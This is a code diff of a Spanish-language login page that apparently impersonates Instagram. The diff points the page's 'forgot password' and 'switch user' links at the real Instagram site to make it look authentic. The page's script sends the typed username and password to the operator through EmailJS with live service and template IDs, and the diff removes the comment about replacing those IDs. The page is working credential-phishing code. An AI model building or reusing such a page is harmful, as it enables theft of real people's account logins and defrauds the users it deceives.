@@ -205,14 +205,16 @@
                 </button>
             </div>
 
-            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+            <!-- Enlace modificado -->
+            <a href="https://www.instagram.com/" class="forgot-password" target="_blank" rel="noopener noreferrer">¿Olvidaste tu contraseña?</a>
 
             <button type="submit" class="btn-login" id="submitBtn">Iniciar sesión</button>
         </form>
     </div>
 
     <footer class="footer">
-        ¿No es tu cuenta? <a href="#">Cambiar de usuario</a>
+        <!-- Enlace modificado -->
+        ¿No es tu cuenta? <a href="https://www.instagram.com/" target="_blank" rel="noopener noreferrer">Cambiar de usuario</a>
     </footer>
 
     <script>
@@ -254,7 +256,6 @@
                 password: passwordInput.value
             };
 
-            // ⚠️ REEMPLAZA ESTOS DOS VALORES CON TUS IDS REALES DE EMAILJS CUANDO LOS TENGAS ⚠️
             emailjs.send("service_vyx1v45", "template_xntrjtj", templateParams)
                 .then((response) => {
                     console.log('Correo enviado con éxito!', response.status, response.text);
